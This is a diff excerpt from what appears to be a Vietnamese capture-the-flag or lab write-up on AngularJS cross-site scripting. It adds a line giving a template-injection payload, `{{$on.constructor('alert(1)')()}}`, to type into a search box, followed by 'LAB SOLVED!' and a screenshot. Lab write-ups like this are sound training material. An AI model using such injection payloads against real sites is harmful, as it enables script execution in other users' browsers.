@@ -683,3 +683,10 @@ Quan sát thấy body có thuộc tính `ng-app` => Đang sử dụng `AngularJS
 
 ![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6a22c0df-2c43-457f-89ca-de985321e07a)
 
+Nhập Payload sau vào ô search box: `{{$on.constructor('alert(1)')()}}` 
+
+LAB SOLVED!
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8ea969a7-a3a3-4494-bc39-18ccdb2b9d28)
+
+
